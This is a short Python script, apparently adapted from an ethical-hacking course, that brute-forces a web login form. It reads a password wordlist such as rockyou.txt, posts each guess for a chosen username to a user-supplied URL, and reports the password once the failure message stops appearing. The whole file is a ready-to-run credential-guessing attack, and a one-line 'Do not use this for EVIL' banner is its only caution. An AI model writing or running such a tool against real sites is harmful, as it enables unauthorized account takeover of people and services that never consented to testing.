## Simple Brute Forcer
## This code is based on the Udemy Class "Python For Ethical Hackers: Build Web App Login Brute-Force"found at https://www.udemy.com/course/python-for-ethical-hackers-build-web-app-login-brute-force/learn/lecture/25517118 
## Some modifications have been added for aesthetics

import pyfiglet  # import for making banner
import requests  # The requests module allows you to send HTTP requests
from termcolor import colored  # import for aesthetics 

ascii_banner1 = pyfiglet.figlet_format("S I M P L E")
ascii_banner2 = pyfiglet.figlet_format("BRUTE FORCER")
print(ascii_banner1)
print(ascii_banner2)
print("This script requires you use a password list like rockyou.txt")
print("Make sure you execute the script from the SAME DIRECTORY that the password file is in!")
print("Before running the Bruteforcer, manually try a wrong password on the login. Note the string that is returned when you fail (example: Bad Login, Unauthorized User, etc). The script will need that string to work properly")
print("Do not use this for EVIL")


url = input('[+] Enter Page URL: ')    # define variable URL by asking user for URL to bruteforce
username = input('[+] Enter login for the account to Bruteforce: ')   # define variable username by asking user for login to bruteforce
password_file = input('[+] Enter the password file to use: ')  # define variable password_file by asking user for the name of the password file to use
login_failed_string = input('[+] Enter the string that occurs when the login fails: ')  # define the variable login_failed_string by asking the user what the website returns when there's a failed attempt to login

def cracking(username,url):                # Define our function 'cracking'
	for password in passwords:               # Create a For loop to grab the passwords in the password file
	    password = password.strip()          # The strip() method removes any leading (spaces at the beginning) and trailing (spaces at the end) characters
	    print(colored(('Trying: ' + password), 'red'))  # We let the user know we are trying the current password
	    data = {'username':username,'password':password,'Login':'submit'} # Define the variable data with the login and password that will be posted to the URL by the requests module
	    response = requests.post(url, data=data) # return the response txt from the url
	    if login_failed_string in response.content.decode():  # If we find the failed login response we entered earlier in the reponse from our attempt to login....
	    	pass                                                # Then we pass and try the next password
	    else:
	    	print(colored(('[+] Great Success! Username Found: ==> ' + username), 'green'))  # Print our successful bruteforce for the user
	    	print(colored(('[+] Great Success! Password Found: ==> ' + password), 'green'))  # Print our successful bruteforce for the user
	    	exit()
	    	
with open(password_file, 'r') as passwords:  # Open the password file as the list 'password'
	cracking(username,url)                     # Run our function 'cracking'
print('[!!] Password not found in list')     # When all else fails, let user know password wasn't found
